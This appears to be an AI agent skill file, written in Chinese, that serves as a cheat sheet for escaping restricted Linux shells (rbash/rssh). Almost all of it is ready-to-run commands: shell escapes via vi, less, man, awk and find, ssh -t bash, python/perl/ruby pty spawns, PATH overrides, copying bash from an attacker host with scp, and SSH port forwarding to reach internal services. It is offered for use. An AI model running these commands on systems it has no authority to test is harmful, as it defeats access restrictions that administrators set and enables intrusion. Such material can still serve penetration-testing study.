---
name: 'rbash-escape'
description: '受限Shell逃逸：rbash/rssh绕过→vi/less/ssh/etc。'
disable-model-invocation: true
metadata: { domain: linux, tier: T3 }
---

## Restricted Shell (rbash/rssh) 逃逸

### 检测
```bash
echo "$0"           # -rbash 或 -rssh
echo $SHELL
# cd 失败、"command not found" 但命令存在 → 受限 shell
```text

### 逃逸方法（按成功率排序）

#### 1. 编辑器逃逸
```bash
vi          → :!bash
vim         → :!bash
ed          → !bash
nano        → ^R ^X bash
emacs       → M-x shell
ne          → !bash
```text

#### 2. 分页器逃逸
```bash
less /etc/passwd → !bash
more /etc/passwd → !bash
man man          → !bash
```text

#### 3. SSH 逃逸（有 SSH 访问权限时）
```bash
ssh user@localhost -t bash
ssh user@localhost -t /bin/bash --norc --noprofile
# -L 端口转发也是绕过（不需要本地 shell）
ssh user@target -L 25151:127.0.0.1:25151
```text

#### 4. 编程语言
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import os;os.system("/bin/bash")'
perl -e 'exec "/bin/bash";'
ruby -e 'exec "/bin/bash"'
lua -e 'os.execute("/bin/bash")'
```text

#### 5. 环境变量 PATH
```bash
# 导出带 bin 目录的 PATH
export PATH=/bin:/usr/bin:$PATH
# 如果 rbash 限制 PATH → 直接调用完整路径
/bin/bash
/bin/sh
```text

#### 6. 其他工具
```bash
awk 'BEGIN{system("/bin/bash")}'
find / -exec /bin/bash \;
echo os.system("/bin/bash") | bash 2>/dev/null
expect -c 'spawn bash'
screen
tmux
script /dev/null -c bash
```text

#### 7. 文件系统（如有写权限）
```bash
# 如果可以用 cp
cp /bin/bash /tmp/bash && /tmp/bash
# 从攻击机 scp
scp user@attacker:/bin/bash /tmp/bash && /tmp/bash
```text

### 注意
- rbash 主要是 PATH 限制 + 禁止 `cd` + 禁止重定向。核心思想是**找到能执行外部命令的任何工具**
- 如果所有工具都被限制 → SSH -L 端口转发到内网服务，不依赖本地 shell
